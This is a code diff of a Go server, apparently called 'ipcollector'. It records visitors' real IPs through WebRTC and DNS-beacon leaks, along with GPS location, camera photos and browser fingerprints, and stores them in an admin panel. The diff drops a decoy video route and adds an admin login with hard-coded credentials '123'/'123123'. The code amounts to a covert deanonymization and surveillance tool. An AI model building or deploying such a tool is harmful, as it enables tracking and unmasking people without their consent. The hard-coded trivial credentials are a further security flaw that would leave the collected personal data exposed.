@@ -1,10 +1,10 @@
 package main
 
 import (
-	"bytes"
 	"context"
 	cryptorand "crypto/rand"
 	"crypto/rsa"
+	"crypto/subtle"
 	"crypto/tls"
 	"crypto/x509"
 	"crypto/x509/pkix"
@@ -83,27 +83,27 @@ func envOr(k, def string) string {
 // ---------------------------------------------------------------------------
 
 type Record struct {
-	ID            int64     `json:"id"`
-	SessionID     string    `json:"session_id"`
-	DNSToken      string    `json:"dns_token"`
-	PublicIP      string    `json:"public_ip"`
-	XForwardedFor string    `json:"x_forwarded_for"`
-	WebRTCIPs     []string  `json:"webrtc_ips"`
-	ResolverIPs   []string  `json:"resolver_ips"`
-	ExternalIPs   []string  `json:"external_ips"`
-	Latitude      float64   `json:"latitude"`
-	Longitude     float64   `json:"longitude"`
-	LocationAcc   float64   `json:"location_accuracy"`
-	LocationErr   string    `json:"location_error"`
-	PhotoPath     string    `json:"photo_path"`
-	HasPhoto      bool      `json:"has_photo"`
-	UserAgent     string    `json:"user_agent"`
-	Language      string    `json:"language"`
-	Platform      string    `json:"platform"`
-	Timezone      string    `json:"timezone"`
-	Screen        string    `json:"screen"`
-	CreatedAt     time.Time `json:"created_at"`
-	UpdatedAt     time.Time `json:"updated_at"`
+	ID             int64     `json:"id"`
+	SessionID      string    `json:"session_id"`
+	DNSToken       string    `json:"dns_token"`
+	PublicIP       string    `json:"public_ip"`
+	XForwardedFor  string    `json:"x_forwarded_for"`
+	WebRTCIPs      []string  `json:"webrtc_ips"`
+	ResolverIPs    []string  `json:"resolver_ips"`
+	ExternalIPs    []string  `json:"external_ips"`
+	Latitude       float64   `json:"latitude"`
+	Longitude      float64   `json:"longitude"`
+	LocationAcc    float64   `json:"location_accuracy"`
+	LocationErr    string    `json:"location_error"`
+	PhotoPath      string    `json:"photo_path"`
+	HasPhoto       bool      `json:"has_photo"`
+	UserAgent      string    `json:"user_agent"`
+	Language       string    `json:"language"`
+	Platform       string    `json:"platform"`
+	Timezone       string    `json:"timezone"`
+	Screen         string    `json:"screen"`
+	CreatedAt      time.Time `json:"created_at"`
+	UpdatedAt      time.Time `json:"updated_at"`
 }
 
 type Store struct {
@@ -425,18 +425,18 @@ func (d *DNSServer) handle(conn *net.UDPConn, q []byte, raddr *net.UDPAddr) {
 
 	// build response
 	resp := []byte{}
-	resp = append(resp, id...)                              // id
-	var rflags uint16 = 0x8000 | 0x0400 | 0x0080           // QR=1, AA=1, RA=1
-	rflags |= flags & 0x0100                                // copy RD
-	resp = append(resp, byte(rflags>>8), byte(rflags))      // flags
-	resp = append(resp, byte(qd>>8), byte(qd))              // qdcount
+	resp = append(resp, id...)                         // id
+	var rflags uint16 = 0x8000 | 0x0400 | 0x0080       // QR=1, AA=1, RA=1
+	rflags |= flags & 0x0100                           // copy RD
+	resp = append(resp, byte(rflags>>8), byte(rflags)) // flags
+	resp = append(resp, byte(qd>>8), byte(qd))         // qdcount
 	ancount := uint16(0)
-	if (qtype == 1 || qtype == 28) && (qclass == 1) {       // A or AAAA, IN
+	if (qtype == 1 || qtype == 28) && (qclass == 1) { // A or AAAA, IN
 		ancount = 1
 	}
-	resp = append(resp, byte(ancount>>8), byte(ancount))    // ancount
-	resp = append(resp, 0, 0)                               // nscount
-	resp = append(resp, 0, 0)                               // arcount
+	resp = append(resp, byte(ancount>>8), byte(ancount)) // ancount
+	resp = append(resp, 0, 0)                           // nscount
+	resp = append(resp, 0, 0)                           // arcount
 	// question section: copy name + type + class
 	resp = append(resp, q[12:pos]...)
 	// answer
@@ -453,9 +453,9 @@ func (d *DNSServer) handle(conn *net.UDPConn, q []byte, raddr *net.UDPAddr) {
 		} else {
 			atype = 28
 		}
-		resp = append(resp, byte(atype>>8), byte(atype)) // type
-		resp = append(resp, 0, 1)                       // class IN
-		resp = append(resp, 0, 0, 0, 60)               // TTL 60
+		resp = append(resp, byte(atype>>8), byte(atype))        // type
+		resp = append(resp, 0, 1)                               // class IN
+		resp = append(resp, 0, 0, 0, 60)                        // TTL 60
 		resp = append(resp, byte(len(rdata)>>8), byte(len(rdata))) // rdlength
 		resp = append(resp, rdata...)
 	}
@@ -563,26 +563,29 @@ func parseTime(s string) time.Time {
 // ---------------------------------------------------------------------------
 
 type App struct {
-	cfg        config
-	store      *Store
-	dns        *DNSServer
-	mux        *http.ServeMux
-	dnsSeen    map[string][]string
+	cfg         config
+	store       *Store
+	dns         *DNSServer
+	mux         *http.ServeMux
+	dnsSeen     map[string][]string
 	dnsSeenLock sync.RWMutex
+	sessions    map[string]time.Time // token -> expiry
+	sessLock    sync.RWMutex
 }
 
 func (a *App) routes() {
 	a.mux.HandleFunc("/", a.handleIndex)
-	a.mux.HandleFunc("/file.mp4", a.handleVideo)
-	a.mux.HandleFunc("/admin", a.handleAdmin)
-	a.mux.HandleFunc("/admin/", a.handleAdmin)
+	a.mux.HandleFunc("/admin/login", a.handleAdminLogin)
+	a.mux.HandleFunc("/admin/logout", a.handleAdminLogout)
+	a.mux.HandleFunc("/admin", a.requireAuth(a.handleAdmin))
+	a.mux.HandleFunc("/admin/", a.requireAuth(a.handleAdmin))
 	a.mux.HandleFunc("/api/session", a.handleSession)
 	a.mux.HandleFunc("/api/report", a.handleReport)
 	a.mux.HandleFunc("/api/photo", a.handlePhoto)
 	a.mux.HandleFunc("/api/dns-beacon", a.handleDNSBeacon)
 	a.mux.HandleFunc("/api/echo", a.handleEcho)
-	a.mux.HandleFunc("/api/admin/records", a.handleAdminList)
-	a.mux.HandleFunc("/api/admin/records/", a.handleAdminDetail)
+	a.mux.HandleFunc("/api/admin/records", a.requireAuth(a.handleAdminList))
+	a.mux.HandleFunc("/api/admin/records/", a.requireAuth(a.handleAdminDetail))
 }
 
 func (a *App) handleIndex(w http.ResponseWriter, r *http.Request) {
@@ -593,18 +596,97 @@ func (a *App) handleIndex(w http.ResponseWriter, r *http.Request) {
 	a.serveFile(w, r, "web/index.html", "text/html; charset=utf-8")
 }
 
-// handleVideo serves the embedded color-bar test video with byte-range
-// support so the <video> element can seek/loop efficiently.
-func (a *App) handleVideo(w http.ResponseWriter, r *http.Request) {
-	b, err := webFS.ReadFile("web/file.mp4")
-	if err != nil {
-		http.NotFound(w, r)
+// requireAuth wraps a handler so only authenticated admins can access it.
+// Unauthenticated HTML requests redirect to /admin/login; API requests get
+// 401 JSON. Neither case blocks the program.
+func (a *App) requireAuth(h http.HandlerFunc) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		c, err := r.Cookie("admin_session")
+		if err != nil || !a.validSession(c.Value) {
+			if strings.HasPrefix(r.URL.Path, "/api/") {
+				w.Header().Set("Content-Type", "application/json")
+				w.WriteHeader(http.StatusUnauthorized)
+				_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "未登录"})
+				return
+			}
+			http.Redirect(w, r, "/admin/login", http.StatusSeeOther)
+			return
+		}
+		h(w, r)
+	}
+}
+
+func (a *App) validSession(token string) bool {
+	if token == "" {
+		return false
+	}
+	a.sessLock.RLock()
+	defer a.sessLock.RUnlock()
+	exp, ok := a.sessions[token]
+	if !ok {
+		return false
+	}
+	if time.Now().After(exp) {
+		return false
+	}
+	return true
+}
+
+func (a *App) createSession() string {
+	token := randToken(32)
+	a.sessLock.Lock()
+	if a.sessions == nil {
+		a.sessions = map[string]time.Time{}
+	}
+	a.sessions[token] = time.Now().Add(24 * time.Hour)
+	a.sessLock.Unlock()
+	return token
+}
+
+func (a *App) deleteSession(token string) {
+	a.sessLock.Lock()
+	delete(a.sessions, token)
+	a.sessLock.Unlock()
+}
+
+// handleAdminLogin serves the login page (GET) or verifies credentials (POST).
+// Username "123", password "123123". Constant-time compare to avoid timing leaks.
+func (a *App) handleAdminLogin(w http.ResponseWriter, r *http.Request) {
+	if r.Method == http.MethodGet {
+		a.serveFile(w, r, "web/admin_login.html", "text/html; charset=utf-8")
 		return
 	}
-	w.Header().Set("Content-Type", "video/mp4")
-	w.Header().Set("Cache-Control", "no-store")
-	w.Header().Set("Accept-Ranges", "bytes")
-	http.ServeContent(w, r, "file.mp4", time.Time{}, bytes.NewReader(b))
+	if r.Method != http.MethodPost {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	_ = r.ParseForm()
+	u, p := r.FormValue("username"), r.FormValue("password")
+	if subtle.ConstantTimeCompare([]byte(u), []byte("123")) != 1 ||
+		subtle.ConstantTimeCompare([]byte(p), []byte("123123")) != 1 {
+		w.Header().Set("Content-Type", "application/json")
+		w.WriteHeader(http.StatusUnauthorized)
+		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "用户名或密码错误"})
+		return
+	}
+	token := a.createSession()
+	http.SetCookie(w, &http.Cookie{
+		Name: "admin_session", Value: token, Path: "/",
+		HttpOnly: true, SameSite: http.SameSiteLaxMode, MaxAge: 86400,
+	})
+	w.Header().Set("Content-Type", "application/json")
+	_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "redirect": "/admin"})
+}
+
+func (a *App) handleAdminLogout(w http.ResponseWriter, r *http.Request) {
+	if c, err := r.Cookie("admin_session"); err == nil {
+		a.deleteSession(c.Value)
+	}
+	http.SetCookie(w, &http.Cookie{
+		Name: "admin_session", Value: "", Path: "/",
+		HttpOnly: true, SameSite: http.SameSiteLaxMode, MaxAge: -1,
+	})
+	http.Redirect(w, r, "/admin/login", http.StatusSeeOther)
 }
 
 func (a *App) handleAdmin(w http.ResponseWriter, r *http.Request) {
@@ -626,12 +708,12 @@ func (a *App) serveFile(w http.ResponseWriter, r *http.Request, name, ctype stri
 func (a *App) handleSession(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "application/json")
 	resp := map[string]any{
-		"session_id":   randToken(16),
-		"dns_token":    randToken(16),
-		"dns_zone":     a.cfg.DNSZone,
-		"public_url":   a.cfg.PublicURL,
-		"server_time":  time.Now().Format(time.RFC3339),
-		"your_ip":      clientIP(r),
+		"session_id":  randToken(16),
+		"dns_token":   randToken(16),
+		"dns_zone":    a.cfg.DNSZone,
+		"public_url":  a.cfg.PublicURL,
+		"server_time": time.Now().Format(time.RFC3339),
+		"your_ip":     clientIP(r),
 		"services": []string{
 			"https://api.ipify.org?format=json",
 			"https://ipapi.co/json/",
@@ -681,7 +763,7 @@ func (a *App) handleReport(w http.ResponseWriter, r *http.Request) {
 	rec := a.store.Upsert(in)
 	w.Header().Set("Content-Type", "application/json")
 	_ = json.NewEncoder(w).Encode(map[string]any{
-		"ok":        true,
+		"ok":         true,
 		"session_id": rec.SessionID,
 		"public_ip":  rec.PublicIP,
 	})
@@ -695,7 +777,7 @@ func (a *App) handlePhoto(w http.ResponseWriter, r *http.Request) {
 	}
 	var payload struct {
 		SessionID string `json:"session_id"`
-		Photo    string `json:"photo"` // data URL or raw base64
+		Photo     string `json:"photo"` // data URL or raw base64
 	}
 	body, err := io.ReadAll(http.MaxBytesReader(w, r.Body, 8<<20))
 	if err != nil {
@@ -780,18 +862,18 @@ func (a *App) handleAdminList(w http.ResponseWriter, r *http.Request) {
 	recs, total := a.store.List(f)
 	// strip large photo path; keep a url instead
 	type item struct {
-		ID         int64     `json:"id"`
-		SessionID  string    `json:"session_id"`
-		PublicIP   string    `json:"public_ip"`
-		WebRTCIPs  []string  `json:"webrtc_ips"`
-		ResolverIPs []string `json:"resolver_ips"`
-		ExternalIPs []string `json:"external_ips"`
-		Lat        float64   `json:"latitude"`
-		Lon        float64   `json:"longitude"`
-		HasPhoto   bool      `json:"has_photo"`
-		PhotoURL   string    `json:"photo_url"`
-		UserAgent  string    `json:"user_agent"`
-		CreatedAt  time.Time `json:"created_at"`
+		ID          int64     `json:"id"`
+		SessionID   string    `json:"session_id"`
+		PublicIP    string    `json:"public_ip"`
+		WebRTCIPs   []string  `json:"webrtc_ips"`
+		ResolverIPs []string  `json:"resolver_ips"`
+		ExternalIPs []string  `json:"external_ips"`
+		Lat         float64   `json:"latitude"`
+		Lon         float64   `json:"longitude"`
+		HasPhoto    bool      `json:"has_photo"`
+		PhotoURL    string    `json:"photo_url"`
+		UserAgent   string    `json:"user_agent"`
+		CreatedAt   time.Time `json:"created_at"`
 	}
 	out := make([]item, 0, len(recs))
 	for _, r := range recs {
@@ -808,9 +890,9 @@ func (a *App) handleAdminList(w http.ResponseWriter, r *http.Request) {
 	}
 	w.Header().Set("Content-Type", "application/json")
 	_ = json.NewEncoder(w).Encode(map[string]any{
-		"records": out,
-		"total":   total,
-		"page":    f.Page,
+		"records":  out,
+		"total":    total,
+		"page":     f.Page,
 		"per_page": f.PerPage,
 	})
 }
@@ -837,27 +919,27 @@ func (a *App) handleAdminDetail(w http.ResponseWriter, r *http.Request) {
 	}
 	// full record (server view)
 	full := map[string]any{
-		"id":             rec.ID,
-		"session_id":     rec.SessionID,
-		"dns_token":      rec.DNSToken,
-		"public_ip":      rec.PublicIP,
+		"id":              rec.ID,
+		"session_id":      rec.SessionID,
+		"dns_token":       rec.DNSToken,
+		"public_ip":       rec.PublicIP,
 		"x_forwarded_for": rec.XForwardedFor,
-		"webrtc_ips":     rec.WebRTCIPs,
-		"resolver_ips":   rec.ResolverIPs,
-		"external_ips":   rec.ExternalIPs,
-		"latitude":       rec.Latitude,
-		"longitude":      rec.Longitude,
-		"location_acc":   rec.LocationAcc,
-		"location_error": rec.LocationErr,
-		"has_photo":      rec.HasPhoto,
-		"photo_url":      photoURL(rec),
-		"user_agent":     rec.UserAgent,
-		"language":       rec.Language,
-		"platform":       rec.Platform,
-		"timezone":       rec.Timezone,
-		"screen":         rec.Screen,
-		"created_at":     rec.CreatedAt,
-		"updated_at":     rec.UpdatedAt,
+		"webrtc_ips":      rec.WebRTCIPs,
+		"resolver_ips":    rec.ResolverIPs,
+		"external_ips":    rec.ExternalIPs,
+		"latitude":        rec.Latitude,
+		"longitude":       rec.Longitude,
+		"location_acc":    rec.LocationAcc,
+		"location_error":  rec.LocationErr,
+		"has_photo":       rec.HasPhoto,
+		"photo_url":       photoURL(rec),
+		"user_agent":      rec.UserAgent,
+		"language":        rec.Language,
+		"platform":        rec.Platform,
+		"timezone":        rec.Timezone,
+		"screen":          rec.Screen,
+		"created_at":      rec.CreatedAt,
+		"updated_at":      rec.UpdatedAt,
 	}
 	w.Header().Set("Content-Type", "application/json")
 	_ = json.NewEncoder(w).Encode(full)
@@ -932,9 +1014,10 @@ func main() {
 	defer cancel()
 
 	app := &App{
-		cfg:   cfg,
-		store: store,
-		mux:   http.NewServeMux(),
+		cfg:      cfg,
+		store:    store,
+		mux:      http.NewServeMux(),
+		sessions: map[string]time.Time{},
 	}
 	app.dns = newDNSServer(cfg.DNSAddr, cfg.DNSZone, cfg.ServerIP, app.onDNSQuery)
 	app.dnsSeen = map[string][]string{}
@@ -996,16 +1079,16 @@ func selfSignedTLSConfig(cfg config) (*tls.Config, error) {
 	}
 	serial, _ := cryptorand.Int(cryptorand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
 	tmpl := x509.Certificate{
-		SerialNumber: serial,
-		Subject:      pkix.Name{CommonName: "ipcollector"},
-		NotBefore:    time.Now().Add(-time.Hour),
-		NotAfter:     time.Now().Add(365 * 24 * time.Hour),
-		IsCA:         true,
-		KeyUsage:     x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign | x509.KeyUsageKeyEncipherment,
-		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth, x509.ExtKeyUsageClientAuth},
+		SerialNumber:          serial,
+		Subject:               pkix.Name{CommonName: "ipcollector"},
+		NotBefore:             time.Now().Add(-time.Hour),
+		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
+		IsCA:                  true,
+		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign | x509.KeyUsageKeyEncipherment,
+		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth, x509.ExtKeyUsageClientAuth},
 		BasicConstraintsValid: true,
-		DNSNames:     []string{"localhost"},
-		IPAddresses:  []net.IP{net.IPv4(127, 0, 0, 1), net.ParseIP("::1")},
+		DNSNames:              []string{"localhost"},
+		IPAddresses:           []net.IP{net.IPv4(127, 0, 0, 1), net.ParseIP("::1")},
 	}
 	for _, h := range cfg.TLSHosts {
 		h = strings.TrimSpace(h)
